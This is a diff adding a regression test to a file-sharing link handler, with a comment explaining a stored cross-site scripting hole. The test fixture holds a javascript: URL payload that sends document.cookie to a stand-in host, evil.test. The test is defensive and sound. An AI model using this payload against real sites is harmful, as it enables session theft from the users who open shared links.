@@ -181,6 +181,34 @@ describe('share: opening a link', () => {
     expect(JSON.stringify(res.body)).not.toContain('user-1');
   });
 
+  /* `files.download_url` is written by the browser, under a policy that lets an
+     account write anything into its own row, and no constraint checks the
+     column. For Cloudinary, Drive and Dropbox the value is handed to the
+     recipient exactly as stored — so a `javascript:` URL saved against one's own
+     file and then shared is script on this origin, in someone else's session.
+     The CSP does not stop it: `script-src` carries 'unsafe-inline', and that is
+     what governs javascript: URLs. */
+  it('refuses to hand out a stored location that is not an http(s) URL', async () => {
+    setup({
+      files: {
+        data: [
+          {
+            ...FILE_ROW,
+            storage_type: 'cloudinary',
+            download_url: 'javascript:fetch("//evil.test?c="+document.cookie)',
+          },
+        ],
+      },
+      shared_links: { data: [liveLink()] },
+    });
+
+    const res = mockResponse();
+    await handler(get({ token: TOKEN }), res);
+
+    expect(res.statusCode).toBe(500);
+    expect(JSON.stringify(res.body)).not.toContain('javascript:');
+  });
+
   it('answers 404 for a token that was never issued', async () => {
     setup({ files: { data: [FILE_ROW] }, shared_links: { data: [] } });
     const res = mockResponse();
